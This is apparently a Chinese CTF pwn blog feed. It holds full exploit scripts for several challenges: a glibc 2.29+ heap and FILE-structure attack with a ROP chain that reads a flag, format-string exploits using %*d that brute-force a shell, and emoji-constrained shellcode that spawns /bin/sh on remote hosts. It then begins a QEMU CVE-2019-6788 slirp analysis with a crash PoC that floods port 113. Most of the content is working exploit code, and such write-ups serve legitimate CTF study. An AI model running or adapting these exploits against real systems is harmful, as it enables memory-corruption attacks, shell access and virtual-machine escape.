magic(num): p.sendlineafter(':', '5') p.sendlineafter(':', str(num))def un_tc(size): for x in range(7): alloc(0, size, 'f') free(0)un_tc(0x98)un_tc(0xe8)for x in range(5): alloc(0, 0xd8, 'f') free(0)alloc(1, 0x98, 'v' * 0x98)un_tc(0x188)free(1)un_tc(0x1e8)# alloc(0, 0x98, 'v')# free(0)alloc(0, 0x188, 'a')payload = b'b' * 0xe0 + p64(0x1f0) + p64(0x10) + b'b' * 8alloc(1, 0xf8, payload)free(0)alloc(0, 0x98, 'v' * 0x98)magic(0xf1)free(0)payload = b'c' * 0xf8 + p64(0xa1) + b'd' * 0x98 + p64(0x61)alloc(0, 0x1e8, payload)free(1)show(0)p.recvuntil('c' * 0xf8)p.recv(8)heap = u64(p.recv(8))libc = u64(p.recv(8)) - 0x1e4ca0log.success('libc :&#123;&#125; heap: &#123;&#125;'.format(hex(libc),hex(heap)))free(0)alloc(0, 0x98, 'nonick')alloc(1, 0x98, 'nonick')free(0)alloc(0, 0x200, p64(0x11) * 20)free(0)payload = b'c' * 0xf8 + p64(0x191) + b'e' * 0xe8alloc(0, 0x1e8, payload)free(1)alloc(1, 0xa8, 'nonick')free(0)fake = p64(0) + p64(0xe1) + p64(heap + 0x1b60) + p64(heap + 0x1dd0 + 0xe0)fake = fake.ljust(0xe0)fake += p64(0) + p64(0xe1) + p64(heap + 0x1dd0) + p64(libc + 0x1E7600 - 0x10)fake += p64(0x11)context.arch = 'amd64'alloc(0, 0x300, fake)free(0)page = heap + 0x20f0page &gt;&gt;= 12page &lt;&lt;= 12sigret = libc + 0x14BC61fake = p64(sigret) * 3fake += p64(heap + 0x20f0 + 0x20)fake += p64(0)fake += p64(libc + 0x00000000000538e3) + p64(0)fake += b'\x00' * 0x30fake += p64(libc + 0xed5dc)fake += b'\x00' * (0xd0 - 0x40)fake += p64(heap + 0x20f0 + 0x20)fake += p64(libc + 0x0000000000026542)fake += p64(page)fake += p64(libc + 0x0000000000026f9e)fake += p64(0x1000)fake += p64(libc + 0x000000000012bda6)fake += p64(7)fake += p64(libc + 0x117590)fake += p64(heap + 0x20f0 + len(fake) - 8)fake += asm('''&#123;&#125;&#123;&#125;lea rdi,[rsp]xor rsi,rsimov rax,2syscall&#123;&#125;&#123;&#125;'''.format( shellcraft.amd64.linux.echo('aaaa'), shellcraft.amd64.pushstr('flag'), shellcraft.amd64.linux.read(3,'rdi',0x100), shellcraft.amd64.linux.write(1,'rsp',0x100)))alloc(0,0x300,fake)free(0)for x in range(10): sz = 0x3f0 - x * 0x10 data = p64(0x11) * (sz &gt;&gt; 3) for y in range(7): alloc(0, sz, data) free(0)payload = b'c' * 0xf8 + p64(0xb1) + b'e' * 0xa8 + p64(0xe1) + p64(libc + 0x1e4d70) + p64(heap + 0x1dd0)alloc(0, 0x1e8, payload)free(1)io_list = libc + 0x1E5660log.success('io list all &#123;&#125;'.format(hex(io_list)))vt = libc + 0x1E5B40 - 0x18alloc(1, 0xd8, b'\x00' * 0x28 + p64(0x11) + p64(0) + p64(0x211) + p64(0x11) * 8 + p64(0x11223344) + p64( heap + 0x20f0 - 8) + p64(heap + 0x1bd0 - 0x70) + p64(1) * 6 + p64(vt))free(0)fake = p64(0xfbad8000) + p64(0x1441) + p64(0x1) + p64(0x1) + p64(0x5) + p64(0x6)payload = b'c'*0xf8 + p64(0xb1) + b'e'*0xa0 + fakealloc(0,0x1e8,payload)free(1)gdb.attach(p)p.sendlineafter(':', '6')p.interactive()'''0x7ffff7e58f60 &lt;__GI__IO_wdo_write&gt;: push r150x7ffff7e58f62 &lt;__GI__IO_wdo_write+2&gt;: push r140x7ffff7e58f64 &lt;__GI__IO_wdo_write+4&gt;: push r130x7ffff7e58f66 &lt;__GI__IO_wdo_write+6&gt;: push r120x7ffff7e58f68 &lt;__GI__IO_wdo_write+8&gt;: push rbp0x7ffff7e58f69 &lt;__GI__IO_wdo_write+9&gt;: push rbx0x7ffff7e58f6a &lt;__GI__IO_wdo_write+10&gt;: mov rbx,rdi0x7ffff7e58f6d &lt;__GI__IO_wdo_write+13&gt;: sub rsp,0x580x7ffff7e58f71 &lt;__GI__IO_wdo_write+17&gt;: mov rax,QWORD PTR fs:0x280x7ffff7e58f7a &lt;__GI__IO_wdo_write+26&gt;: mov QWORD PTR [rsp+0x48],rax0x7ffff7e58f7f &lt;__GI__IO_wdo_write+31&gt;: xor eax,eax0x7ffff7e58f81 &lt;__GI__IO_wdo_write+33&gt;: test rdx,rdx0x7ffff7e58f84 &lt;__GI__IO_wdo_write+36&gt;: je 0x7ffff7e59078 &lt;__GI__IO_wdo_write+280&gt;0x7ffff7e58f8a &lt;__GI__IO_wdo_write+42&gt;: mov r14,rsi0x7ffff7e58f8d &lt;__GI__IO_wdo_write+45&gt;: mov r15,rdx0x7ffff7e58f90 &lt;__GI__IO_wdo_write+48&gt;: mov r9,QWORD PTR [rdi+0x28]0x7ffff7e58f94 &lt;__GI__IO_wdo_write+52&gt;: mov rbp,QWORD PTR [rdi+0x20]0x7ffff7e58f98 &lt;__GI__IO_wdo_write+56&gt;: mov r12,QWORD PTR [rdi+0x98]0x7ffff7e58f9f &lt;__GI__IO_wdo_write+63&gt;: cmp QWORD PTR [rdi+0x30],r90x7ffff7e58fa3 &lt;__GI__IO_wdo_write+67&gt;: je 0x7ffff7e59110 &lt;__GI__IO_wdo_write+432&gt;0x7ffff7e58fa9 &lt;__GI__IO_wdo_write+73&gt;: lea rax,[rsp+0x20]0x7ffff7e58fae &lt;__GI__IO_wdo_write+78&gt;: mov QWORD PTR [rsp+0x8],rax0x7ffff7e58fb3 &lt;__GI__IO_wdo_write+83&gt;: lea rax,[rsp+0x28]0x7ffff7e58fb8 &lt;__GI__IO_wdo_write+88&gt;: mov QWORD PTR [rsp+0x10],rax0x7ffff7e58fbd &lt;__GI__IO_wdo_write+93&gt;: lea rax,[rsp+0x30]0x7ffff7e58fc2 &lt;__GI__IO_wdo_write+98&gt;: mov QWORD PTR [rsp+0x18],rax0x7ffff7e58fc7 &lt;__GI__IO_wdo_write+103&gt;: jmp 0x7ffff7e59050 &lt;__GI__IO_wdo_write+240&gt;0x7ffff7e58fcc &lt;__GI__IO_wdo_write+108&gt;: nop DWORD PTR [rax+0x0]0x7ffff7e58fd0 &lt;__GI__IO_wdo_write+112&gt;: mov rax,QWORD PTR [rbx+0x40]0x7ffff7e58fd4 &lt;__GI__IO_wdo_write+116&gt;: mov rdi,QWORD PTR [rbx+0xa0]0x7ffff7e58fdb &lt;__GI__IO_wdo_write+123&gt;: mov QWORD PTR [rsp+0x28],r90x7ffff7e58fe0 &lt;__GI__IO_wdo_write+128&gt;: mov rdx,r140x7ffff7e58fe3 &lt;__GI__IO_wdo_write+131&gt;: lea rcx,[r14+r15*4]0x7ffff7e58fe7 &lt;__GI__IO_wdo_write+135&gt;: push QWORD PTR [rsp+0x10]0x7ffff7e58feb &lt;__GI__IO_wdo_write+139&gt;: lea rsi,[rdi+0x58]0x7ffff7e58fef &lt;__GI__IO_wdo_write+143&gt;: push rax0x7ffff7e58ff0 &lt;__GI__IO_wdo_write+144&gt;: mov rdi,r120x7ffff7e58ff3 &lt;__GI__IO_wdo_write+147&gt;: mov r8,QWORD PTR [rsp+0x18]0x7ffff7e58ff8 &lt;__GI__IO_wdo_write+152&gt;: call QWORD PTR [r12+0x8]0x7ffff7f1bc61 &lt;clntunix_destroy+1&gt;: mov rbp,rdi0x7ffff7f1bc64 &lt;clntunix_destroy+4&gt;: push rbx0x7ffff7f1bc65 &lt;clntunix_destroy+5&gt;: sub rsp,0x80x7ffff7f1bc69 &lt;clntunix_destroy+9&gt;: mov rbx,QWORD PTR [rdi+0x10]0x7ffff7f1bc6d &lt;clntunix_destroy+13&gt;: mov eax,DWORD PTR [rbx+0x4]0x7ffff7f1bc70 &lt;clntunix_destroy+16&gt;: test eax,eax0x7ffff7f1bc72 &lt;clntunix_destroy+18&gt;: jne 0x7ffff7f1bca8 &lt;clntunix_destroy+72&gt;0x7ffff7f1bc74 &lt;clntunix_destroy+20&gt;: mov rax,QWORD PTR [rbx+0xd0]0x7ffff7f1bc7b &lt;clntunix_destroy+27&gt;: mov rax,QWORD PTR [rax+0x38]0x7ffff7f1bc7f &lt;clntunix_destroy+31&gt;: test rax,rax0x7ffff7f1bc82 &lt;clntunix_destroy+34&gt;: je 0x7ffff7f1bc8d &lt;clntunix_destroy+45&gt;0x7ffff7f1bc84 &lt;clntunix_destroy+36&gt;: lea rdi,[rbx+0xc8]0x7ffff7f1bc8b &lt;clntunix_destroy+43&gt;: call rax0x7ffff7ebd5dc &lt;check_halt_state_context+124&gt;: leave0x7ffff7ebd5dd &lt;check_halt_state_context+125&gt;: xor eax,eax0x7ffff7ebd5df &lt;check_halt_state_context+127&gt;: pop rbx0x7ffff7ebd5e0 &lt;check_halt_state_context+128&gt;: pop rbp0x7ffff7ebd5e1 &lt;check_halt_state_context+129&gt;: pop r120x7ffff7ebd5e3 &lt;check_halt_state_context+131&gt;: ret''' Midnight sunCTF pwn4新的fmt用法：%*d，在屏幕上打印格式化字符串对应位置上的数据的%d形式数量的字符。 %*25$d%16$n：将格式化字符串的第25个参数的%d形式的数量的字符打印到屏幕上并写入到第16个参数所指向的内存中。 复习了一下log.progress的用法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding:utf-8from pwn import *import subprocessimport sys,os,stringelf_path = './pwn4'remote_libc_path = ''#P = ELF(elf_path)context(os='linux',arch='i386')context.terminal = ['terminator','-x','sh','-c']#context.terminal = ['tmux','split','-h']#context.log_level = 'debug'local = 1if local == 1: p = process(elf_path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote() #libc = ELF(remote_libc_path)def debug(cmd): gdb.attach(p,cmd) pause()def one_gadget(filename): return map(int,subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))p.recvuntil('user: ')p.sendline("%*25$d%16$n")p.recvuntil("code: ")#gdb.attach(p,'b fprintf')#raw_input()p.sendline(str(10))p.recvuntil("logged: ")tot = 0l = log.progress('Receiving all data')log.info('Press CTRL+C to switch to interactive...');while 1: try: data = p.recv(1024*1024) tot += len(data) l.status('%d MB', tot/1e6) except: breakl.success('done (%d MB)', tot/1e6)p.interactive() simple_echoserver思路学习的balsn的思路： 用到了上面那题的思路，也就是%*d，好像连续两次%k$n没法连环修改。。但是逐个位置对过去可以。。。 需要爆破： Fmt string change rbp chain can overwrite stack. Use fmt string %*d to print the count of the lower 4 bytes of main_ret address. Change main_ret to one_gadget ,then get the shell. need a stack lsb bruteforce &amp; (main_ret_address &amp; 0xffffffff) &lt; 0x80000000 (1/32) Kirin大佬的思路没来得及复现，感觉比较吊。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import sysimport timeimport randomhost = 'pwnable.org'port = 12020binary = "./simple_echoserver"context.binary = binaryelf = ELF(binary)context.terminal = ['tmux','split','-h']#context.log_level = 'debug'if len(sys.argv) == 1: r = process(binary,aslr=True,stderr=open('/dev/null','w'))else: r = remote(host ,port)def exp(): r.recvuntil("name: ") r.sendline("%c"*17+"%"+str(0x38-17-13)+"c%hhn"+"%c"*27+"%"+str(0x4f322-0x21b97-27-0x38)+"c%*d"+"%39$n") #r.sendline('%8c.'*24+'%p.%p.%13$p') #r.sendline("%"+str(0x38-13)+"c%19$hhn"+"%"+str(0x4f322-0x21b97-0x38)+"c%*48$d"+"%39$n") r.recvuntil(": ") r.sendline("A") r.recvuntil("ourself!\n") r.sendline("~.")if __name__ == '__main__': while True: exp() try: r.sendline("echo AAAA") if 'AAAA' in r.recv(): print("shellllll") break else: r.close() r = process(binary,aslr=True,stderr=open('/dev/null','w')) except: r.close() r = process(binary,aslr=True,stderr=open('/dev/null','w')) r.interactive()'''|0000| 0x7fffffffe3d8 --&gt; 0x55555555541a (nop)│0008| 0x7fffffffe3e0 --&gt; 0x0│0016| 0x7fffffffe3e8 --&gt; 0x555555558160 ("%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%42c%hhn%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%186152c%*d%39$n")│0024| 0x7fffffffe3f0 --&gt; 0x7fffffffe510 --&gt; 0x7fffffffe530 --&gt; 0x5555555554e0 (endbr64)│0032| 0x7fffffffe3f8 --&gt; 0x555555555443 (lea rdi,[rip+0xc5b] # 0x5555555560a5)│0040| 0x7fffffffe400 --&gt; 0x0│0048| 0x7fffffffe408 --&gt; 0x0│0056| 0x7fffffffe410 --&gt; 0x7fffffffe510 --&gt; 0x7fffffffe530 --&gt; 0x5555555554e0 (endbr64)│0064| 0x7fffffffe418 --&gt; 0x7ffff7dcfa00 --&gt; 0xfbad208b│0072| 0x7fffffffe420 --&gt; 0xd68 ('h\r')│0080| 0x7fffffffe428 --&gt; 0x7ffff7a71148 (&lt;_IO_new_file_underflow+296&gt;: test rax,rax)│0088| 0x7fffffffe430 --&gt; 0x7ffff7dcfa00 --&gt; 0xfbad208b│0096| 0x7fffffffe438 --&gt; 0x7ffff7dcc2a0 --&gt; 0x0│0104| 0x7fffffffe440 --&gt; 0x5555555550f0 (endbr64)│0112| 0x7fffffffe448 --&gt; 0x41 ('A')│0120| 0x7fffffffe450 --&gt; 0x7fffffffe4f0 --&gt; 0x7fffffffe510 --&gt; 0x7fffffffe530 --&gt; 0x5555555554e0 (endbr64)│0128| 0x7fffffffe458 --&gt; 0x5555555550f0 (endbr64)│0136| 0x7fffffffe460 --&gt; 0x7fffffffe610 --&gt; 0x1│0144| 0x7fffffffe468 --&gt; 0x0│0152| 0x7fffffffe470 --&gt; 0x0│0160| 0x7fffffffe478 --&gt; 0x555555555348 (mov rcx,QWORD PTR [rbp-0x18])│0168| 0x7fffffffe480 --&gt; 0x7ffff7dcfa00 --&gt; 0xfbad208b│0176| 0x7fffffffe488 --&gt; 0x7fffffffe490 --&gt; 0x0│0184| 0x7fffffffe490 --&gt; 0x0│0192| 0x7fffffffe498 --&gt; 0x7fffffffe610 --&gt; 0x1│--More--(25/50)│0200| 0x7fffffffe4a0 --&gt; 0x0│0208| 0x7fffffffe4a8 --&gt; 0x7ffff7a723f2 (&lt;__GI__IO_default_uflow+50&gt;: cmp eax,0xffffffff)│0216| 0x7fffffffe4b0 --&gt; 0x36 ('6')│0224| 0x7fffffffe4b8 --&gt; 0x5555555581d0 --&gt; 0x0│0232| 0x7fffffffe4c0 --&gt; 0x7fffffffe4f0 --&gt; 0x7fffffffe510 --&gt; 0x7fffffffe530 --&gt; 0x5555555554e0 (endbr64)│0240| 0x7fffffffe4c8 --&gt; 0x55555555528d (mov r12d,eax)│0248| 0x7fffffffe4d0 --&gt; 0x10055556029│0256| 0x7fffffffe4d8 --&gt; 0xf54994a37af3ab00│0264| 0x7fffffffe4e0 --&gt; 0x0│0272| 0x7fffffffe4e8 --&gt; 0x0│0280| 0x7fffffffe4f0 --&gt; 0x7fffffffe510 --&gt; 0x7fffffffe530 --&gt; 0x5555555554e0 (endbr64)│0288| 0x7fffffffe4f8 --&gt; 0x5555555553b3 (mov rdx,QWORD PTR [rbp-0x8])│0296| 0x7fffffffe500 --&gt; 0x7fffffffe610 --&gt; 0x1│0304| 0x7fffffffe508 --&gt; 0xf54994a37af3ab00│0312| 0x7fffffffe510 --&gt; 0x7fffffffe530 --&gt; 0x5555555554e0 (endbr64)│0320| 0x7fffffffe518 --&gt; 0x5555555554d0 (mov eax,0x0)│0328| 0x7fffffffe520 --&gt; 0x7fffffffe610 --&gt; 0x1│0336| 0x7fffffffe528 --&gt; 0x0│0344| 0x7fffffffe530 --&gt; 0x5555555554e0 (endbr64)│0352| 0x7fffffffe538 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;: mov edi,eax)│0360| 0x7fffffffe540 --&gt; 0x1│0368| 0x7fffffffe548 --&gt; 0x7fffffffe618 --&gt; 0x7fffffffe826 ("./simple_echoserver")│0376| 0x7fffffffe550 --&gt; 0x100008000│0384| 0x7fffffffe558 --&gt; 0x5555555554b2 (push rbp)│0392| 0x7fffffffe560 --&gt; 0x0''' eeemjio思路可控两字节shellcode和当时的寄存器以及栈中脏数据。 观察寄存器，r11存有mmap_addr+4，所以push r11，在最后ret时劫持执行流即可。 短跳转的范围： exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#coding:utf-8from pwn import *import subprocessimport sys,os,stringelf_path = './eeemoji'remote_libc_path = ''local_libc_x86_path = '/lib/i386-linux-gnu/libc.so.6'local_libc_x64_path = '/lib/x86_64-linux-gnu/libc.so.6'#P = ELF(elf_path)context(os='linux',arch='amd64')#context.terminal = ['terminator','-x','sh','-c']context.terminal = ['tmux','split','-h']context.log_level = 'debug'local = 0if local == 1: p = process(elf_path) if context.arch == 'amd64': libc = ELF(local_libc_x64_path) else: libc = ELF(local_libc_x86_path)else: p = remote('pwnable.org',31323) #libc = ELF(remote_libc_path)def debug(cmd): gdb.attach(p,cmd) pause()def one_gadget(filename): return map(int,subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))def emo(a): import struct return (struct.pack('&lt;I', a).decode('utf-32'))def Pijiu(): p.recvuntil('miaow\n') p.recvuntil('\n') p.sendline('🍺')def Horse(): p.recvuntil('miaow\n') p.recvuntil('\n') p.sendline('🐴')def Niu(): p.recvuntil('miaow\n') p.recvuntil('\n') p.sendline('🐮')Pijiu()p.recvuntil('mmap() at @')mmap_addr = int(p.recvline()[:-1],16)log.success('mmap_addr = '+hex(mmap_addr))Horse()#gdb.attach(p)#raw_input()payload = '\xff\xff\x10\x00'.decode('utf-32').encode('utf-8')payload+= '\x53\xeb\x01\x00'.decode('utf-32').encode('utf-8')payload+= '\x5f\xeb\x01\x00'.decode('utf-32').encode('utf-8')payload+= '\x53\xeb\x01\x00'.decode('utf-32').encode('utf-8')payload+= '\x58\xeb\x01\x00'.decode('utf-32').encode('utf-8')payload+= '\x56\xeb\x01\x00'.decode('utf-32').encode('utf-8')payload+= '\x5a\xeb\x01\x00'.decode('utf-32').encode('utf-8')payload+= '\x0f\x05\x00\x00'.decode('utf-32').encode('utf-8')payload+= 'a'*(0x80-8)p.sendline(payload+'\x41\x53\x00\x00'.decode('utf-32').encode('utf-8'))sleep(0.1)#raw_input()p.send('\x90'*0x20+asm(shellcraft.amd64.linux.sh()))p.interactive() eeeeeemjio思路仍然是可以控制两字节的shellcode，但是这时候寄存器只有rip，rsp和rdx是存有有意义的值的。 突破点在于如何将rip劫持到可控地址上，也就是mmap ~ mmap+0x100范围的地址上。 直接用jmp短跳转是不太可能的，因为后面不可控，结合此时具体情境，此时只有rsp和rdx可以操作，所以开始想办法操作rsp，用rdx劫持rsp，考虑到只有两字节可控，所以and esp,edx成为考虑对象，且题目没有限制mmap的次数，所以可以一直mmap直到出现符合要求的mmap地址，即mmap_addr&amp;0xffff=0x8000且小于0x10ffff，且使esp&amp;edx之后结果的后两个字节为0x0000即可，在后续add rsp,0x8000的时候rsp就会被劫持到mmap_addr的地址，然后再用最后的ret控制执行流。 and/or/xor/xchg exx,exx时会清空两个rxx的高位，对exx进行赋值时也会清空rxx的高位，例如rax原本为0x1111111111111111然后执行mov eax,0x22222222之后，rax会变为0x22222222。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#coding:utf-8from pwn import *import subprocessimport sys,os,stringelf_path = './eeeeeemoji'remote_libc_path = ''local_libc_x86_path = '/lib/i386-linux-gnu/libc.so.6'local_libc_x64_path = '/lib/x86_64-linux-gnu/libc.so.6'#P = ELF(elf_path)context(os='linux',arch='amd64')#context.terminal = ['terminator','-x','sh','-c']context.terminal = ['tmux','split','-h']#context.log_level = 'debug'local = 1if local == 1: p = process(elf_path) if context.arch == 'amd64': libc = ELF(local_libc_x64_path) else: libc = ELF(local_libc_x86_path)else: p = remote('pwnable.org',31323) #libc = ELF(remote_libc_path)def debug(cmd): gdb.attach(p,cmd) pause()def one_gadget(filename): return map(int,subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))def emo(a): import struct return (struct.pack('&lt;I', a).decode('utf-32'))def Pijiu(): p.recvuntil('miaow\n') p.recvuntil('\n') p.sendline('🍺')def Horse(): p.recvuntil('miaow\n') p.recvuntil('\n') p.sendline('🐴')def Niu(): p.recvuntil('miaow\n') p.recvuntil('\n') p.sendline('🐮')def my(s): return s.ljust(4,"\x00").decode('utf-32').encode('utf-8')for i in range(1000): Pijiu() p.recvuntil('mmap() at @') mmap_addr = int(p.recvline()[:-1],16) log.success('mmap_addr = '+hex(mmap_addr)) if mmap_addr &lt; 0x10ffff and (mmap_addr&amp;0xffff) == 0x8000: breakHorse()#gdb.attach(p,'b *0x555555554df9')raw_input()payload = ''payload+= my('^\xeb\x01')+my('Z\xeb\x01') #r15 pop rsi pop rdxpayload+= my('X\xeb\x01')+my('\x0f\x05') #r14 pop rax syscallpayload+= my('\x00')+my('\x00') #r13payload+= my('\x00')+my('\x00') #r12payload+= my('\x00')+my('\x00') #r11payload+= my('\x00')+my('\x00') #r10payload+= my('\x00')+my('\x00') #r9payload+= my('\x00')+my('\x00') #r8payload+= my('\x00')+my('\x00') #rbppayload+= my('\x00')+my('\x00') #rsipayload+= my('\x00')+my('\x00') #rdipayload+= my('\x00')+my('\x00') #rdxpayload+= my('\x00')+my('\x00') #rcxpayload+= my('\x00')+my('\x00') #rbxpayload+= my('\x00')+my('\x00') #raxpayload+= my('\x00')+my('\x00') #rflagpayload+= my(p32(mmap_addr+0x88))+my('\x00') #rax = mmap_addr+0x88payload+= my(p32(mmap_addr))+my('\x00')payload+= my(p32(mmap_addr))+my('\x00')payload+= my(p32(mmap_addr))+my('\x00')payload+= my('\x00')+my('\x00')payload+= 'a'*(0x80-42)payload+= my('!\xd4') #and esp,edxp.sendline(payload)raw_input()p.send('\x90'*0x20+asm(shellcraft.amd64.linux.sh()))p.interactive()'''=&gt; 0x555555554df9: call rdx''' playtheNewNuLL_writeup 天枢_writeup printpaperchildshell]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>Glibc2.29_up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-6788调试分析]]></title>
    <url>%2F2020%2F05%2F20%2FCVE-2019-6788%2F</url>
    <content type="text"><![CDATA[CVE-2019-6788前置知识调了几个CVE之后，我觉得CVE和CTF最大的区别在于，首先你需要对于CVE发生的设备如何运作有深刻的理解，因为我们需要写程序与其交互来触发poc/exp(可能我们复现时觉得只用到了一小部分，但是我相信作为发现者，其对于此软件和此模块的功能作用等一定有着深刻的见解)。其次需要对相关领域的知识很了解才能有更广的思路去书写构造相对稳定的exp。 协议与其对应的数据包格式 slirp相关 IP Fragmentation相关 如何利用raw socket发送自己构造的tcp数据包： https://www.pdbuchan.com/rawsock/rawsock.html https://www.pdbuchan.com/rawsock/get4.c https://www.pdbuchan.com/rawsock/icmp4.c https://sock-raw.org/papers/sock_raw SOCK_RAW的内幕和应用 搭建环境可以直接使用CVE-2015-5165搭建好的img和bzImage，然后qemu需要重新checkout一下，作者使用的是v3.1.50，但是github上已经没有这个version了，所以这里用v3.1.0代替： 关于参数解释： https://my.oschina.net/kelvinxupt/blog/265108 1234567sudo cp -r ../CVE-2015-5165/qemu ./cd qemugit checkout tags/v3.1.0mkdir -p bin/debug/naivecd bin/debug/naive../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werrormake -j4 启动脚本run.sh： 1234567./qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 \-kernel ./bzImage \-append "console=ttyS0 root=/dev/sda rw quiet" \-enable-kvm -m 2G -nographic \-hda ../img/qemu.img \#-net user,hostfwd=tcp::2222-:22 -net nic \-L ./pc-bios \ 关于-net，-netdev，-nic参数的解释说明： https://zhuanlan.zhihu.com/p/41258581 关于qemu配置网络： https://wzt.ac.cn/2019/09/10/QEMU-networking/ 调试与poc需要使用user mode(slirp)启动qemu，启动脚本为： 123456./qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 \-kernel ./bzImage \-append "console=ttyS0 root=/dev/sda rw quiet" \-enable-kvm -m 2G -nographic \-hda ../img/qemu.img \-L ./pc-bios 启动后查看网卡，发现存在ip为10.0.2.15的局域网网卡，与其对应的宿主机网卡ip为10.0.2.2(在宿主机上看不到)。 poc.c： 12345678910111213141516171819202122232425// poc.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;netdb.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;int main() &#123; int s, ret; struct sockaddr_in ip_addr; char buf[0x500]; s = socket(AF_INET,SOCK_STREAM,0); ip_addr.sin_family = AF_INET; ip_addr.sin_addr.s_addr = inet_addr("10.0.2.2"); // host IP ip_addr.sin_port = htons(113); // vulnerable port connect(s,(struct sockaddr *)&amp;ip_addr,sizeof(struct sockaddr_in)); memset(buf,'A',0x500); while(1) &#123; write(s,buf,0x500); &#125; return 0;&#125; 在宿主机上运行sudo nc -lvv 113，在虚拟机里运行poc，成功触发crash： poc中的host IP未必需要一定要是宿主机，其他可联通机器的ip也可。 漏洞分析断在tcp_emu： 1234567891011121314151617181920212223242526272829303132333435363738#0 tcp_emu (so=0x7f46f8000d40, m=0x7f46f80140e0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/slirp/tcp_subr.c:558#1 0x00005652e9b7c521 in tcp_input (m=0x7f46f80140e0, iphlen=0x14, inso=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/slirp/tcp_input.c:499#2 0x00005652e9b74aee in ip_input (m=0x7f46f80140e0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/slirp/ip_input.c:202#3 0x00005652e9b772fc in slirp_input (slirp=0x5652ebd188c0, pkt=0x7f470a85cc70 "RU\n", pkt_len=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/slirp/slirp.c:758#4 0x00005652e9b6be89 in net_slirp_receive (nc=0x5652ebd186c0, buf=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/slirp.c:114#5 0x00005652e9b60ebd in qemu_deliver_packet (sender=0x5652ebd18120, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536, opaque=0x5652ebd186c0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:577#6 0x00005652e9b62ebe in qemu_net_queue_deliver (queue=0x5652ebd17e80, sender=0x5652ebd18120, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/queue.c:157#7 0x00005652e9b62fc7 in qemu_net_queue_send (queue=0x5652ebd17e80, sender=0x5652ebd18120, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/queue.c:192#8 0x00005652e9b61043 in qemu_send_packet_async_with_flags (sender=0x5652ebd18120, flags=0x0, buf=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:640#9 0x00005652e9b6107b in qemu_send_packet_async (sender=0x5652ebd18120, buf=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:647#10 0x00005652e9b610a8 in qemu_send_packet (nc=0x5652ebd18120, buf=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:653#11 0x00005652e9b6385d in net_hub_receive (hub=0x5652ebd17f40, source_port=0x5652ebd19570, buf=0x7f470a85cc70 "RU\n", len=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/hub.c:55#12 0x00005652e9b63a6a in net_hub_port_receive (nc=0x5652ebd19570, buf=0x7f470a85cc70 "RU\n", len=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/hub.c:114#13 0x00005652e9b60ebd in qemu_deliver_packet (sender=0x5652ed11d1c0, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536, opaque=0x5652ebd19570) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:577#14 0x00005652e9b62ebe in qemu_net_queue_deliver (queue=0x5652ebd18390, sender=0x5652ed11d1c0, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/queue.c:157#15 0x00005652e9b62fc7 in qemu_net_queue_send (queue=0x5652ebd18390, sender=0x5652ed11d1c0, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/queue.c:192#16 0x00005652e9b61043 in qemu_send_packet_async_with_flags (sender=0x5652ed11d1c0, flags=0x0, buf=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:640#17 0x00005652e9b6107b in qemu_send_packet_async (sender=0x5652ed11d1c0, buf=0x7f470a85cc70 "RU\n", 